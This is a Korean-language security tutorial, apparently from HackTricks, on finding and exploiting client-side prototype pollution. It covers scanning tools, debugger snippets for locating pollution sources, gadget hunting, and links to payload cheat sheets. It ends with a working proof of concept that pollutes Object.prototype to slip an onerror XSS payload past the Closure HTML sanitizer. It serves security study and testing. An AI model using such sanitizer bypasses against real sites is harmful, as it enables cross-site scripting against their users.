# 클라이언트 사이드 프로토타입 오염

{{#include ../../../banners/hacktricks-training.md}}

## 자동 도구를 사용한 발견

도구 [**https://github.com/dwisiswant0/ppfuzz**](https://github.com/dwisiswant0/ppfuzz?tag=v1.0.0)**,** [**https://github.com/kleiton0x00/ppmap**](https://github.com/kleiton0x00/ppmap) **및** [**https://github.com/kosmosec/proto-find**](https://github.com/kosmosec/proto-find) 를 사용하여 **프로토타입 오염 취약점**을 **찾을 수 있습니다**.

또한, **브라우저 확장 프로그램** [**PPScan**](https://github.com/msrkp/PPScan)을 사용하여 **접속하는** **페이지**를 **자동으로** **스캔**하여 프로토타입 오염 취약점을 찾을 수 있습니다.

### 속성이 사용되는 위치 디버깅 <a href="#id-5530" id="id-5530"></a>
```javascript
// Stop debugger where 'potentialGadget' property is accessed
Object.defineProperty(Object.prototype, "potentialGadget", {
__proto__: null,
get() {
console.trace()
return "test"
},
})
```
### Prototype Pollution의 근본 원인 찾기 <a href="#id-5530" id="id-5530"></a>

프로토타입 오염 취약점이 도구에 의해 식별되면, 코드가 지나치게 복잡하지 않은 경우, Chrome 개발자 도구에서 `location.hash`, `decodeURIComponent`, 또는 `location.search`와 같은 키워드를 검색하여 취약점을 찾을 수 있습니다. 이 접근 방식은 JavaScript 코드의 취약한 섹션을 정확히 찾아내는 데 도움이 됩니다.

더 크고 복잡한 코드베이스의 경우, 취약한 코드를 발견하는 간단한 방법은 다음 단계를 포함합니다:

1. 도구를 사용하여 취약점을 식별하고 생성자에서 속성을 설정하도록 설계된 페이로드를 얻습니다. ppmap에서 제공하는 예시는 다음과 같을 수 있습니다: `constructor[prototype][ppmap]=reserved`.
2. 페이지에서 실행될 JavaScript 코드의 첫 번째 줄에 중단점을 설정합니다. 페이로드로 페이지를 새로 고치고 이 중단점에서 실행을 일시 중지합니다.
3. JavaScript 실행이 일시 중지된 동안, JS 콘솔에서 다음 스크립트를 실행합니다. 이 스크립트는 'ppmap' 속성이 생성될 때 신호를 보내어 그 출처를 찾는 데 도움을 줍니다:
```javascript
function debugAccess(obj, prop, debugGet = true) {
var origValue = obj[prop]

Object.defineProperty(obj, prop, {
get: function () {
if (debugGet) debugger
return origValue
},
set: function (val) {
debugger
origValue = val
},
})
}

debugAccess(Object.prototype, "ppmap")
```
4. **소스** 탭으로 돌아가서 “스크립트 실행 재개”를 선택합니다. JavaScript는 계속 실행되며, 'ppmap' 속성이 예상대로 오염됩니다. 제공된 스니펫을 활용하면 'ppmap' 속성이 오염되는 정확한 위치를 식별할 수 있습니다. **호출 스택**을 검사하면 오염이 발생한 다양한 스택을 관찰할 수 있습니다.

어떤 스택을 조사할지 결정할 때, JavaScript 라이브러리 파일과 관련된 스택을 목표로 하는 것이 유용합니다. 프로토타입 오염은 이러한 라이브러리 내에서 자주 발생하기 때문입니다. 라이브러리 파일에 대한 연결을 검사하여 관련 스택을 식별합니다(오른쪽에 표시된 이미지와 유사하게). 4행과 6행과 같이 여러 스택이 있는 경우, 4행의 스택이 논리적인 선택입니다. 이는 오염의 초기 발생을 나타내며, 따라서 취약점의 근본 원인입니다. 스택을 클릭하면 취약한 코드로 이동합니다.

![https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg](https://miro.medium.com/max/1400/1*S8NBOl1a7f1zhJxlh-6g4w.jpeg)

## 스크립트 가젯 찾기

가젯은 **PP 취약점이 발견되면 악용될 코드**입니다.

애플리케이션이 간단하다면, **`srcdoc/innerHTML/iframe/createElement`**와 같은 **키워드**를 **검색**하고 소스 코드를 검토하여 **JavaScript 실행으로 이어지는지** 확인할 수 있습니다. 때때로 언급된 기술이 가젯을 전혀 찾지 못할 수도 있습니다. 그런 경우, 순수 소스 코드 검토를 통해 아래 예와 같은 멋진 가젯을 발견할 수 있습니다.

### Mithil 라이브러리 코드에서 PP 가젯 찾기 예시

이 글을 확인하세요: [https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/](https://blog.huli.tw/2022/05/02/en/intigriti-revenge-challenge-author-writeup/)

## 취약한 라이브러리를 위한 페이로드 재컴파일

- [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet#prototype-pollution)
- [https://github.com/BlackFan/client-side-prototype-pollution](https://github.com/BlackFan/client-side-prototype-pollution)

## PP를 통한 HTML 세정기 우회

[**이 연구**](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)는 일부 HTML 세정기 라이브러리에서 제공하는 **세정기를 우회하기 위해 사용할 PP 가젯**을 보여줍니다:

- **sanitize-html**

<figure><img src="../../../images/image (1140).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-7.png"><figcaption></figcaption></figure>

- **dompurify**

<figure><img src="../../../images/image (1141).png" alt="https://research.securitum.com/wp-content/uploads/sites/2/2020/08/image-9.png"><figcaption></figcaption></figure>

- **Closure**
```html
<!-- from https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/ -->
<script>
Object.prototype['* ONERROR'] = 1;
Object.prototype['* SRC'] = 1;
</script>
<script src=https://google.github.io/closure-library/source/closure/goog/base.js></script>
<script>
goog.require('goog.html.sanitizer.HtmlSanitizer');
goog.require('goog.dom');
</script>
<body>
<script>
const html = '<img src onerror=alert(1)>';
const sanitizer = new goog.html.sanitizer.HtmlSanitizer();
const sanitized = sanitizer.sanitize(html);
const node = goog.dom.safeHtmlToNode(sanitized);

document.body.append(node);
</script>
```
## 참고문헌

- [https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746](https://infosecwriteups.com/hunting-for-prototype-pollution-and-its-vulnerable-code-on-js-libraries-5bab2d6dc746)
- [https://blog.s1r1us.ninja/research/PP](https://blog.s1r1us.ninja/research/PP)
- [https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/#:\~:text=my%20challenge.-,Closure,-Closure%20Sanitizer%20has](https://research.securitum.com/prototype-pollution-and-bypassing-client-side-html-sanitizers/)

{{#include ../../../banners/hacktricks-training.md}}
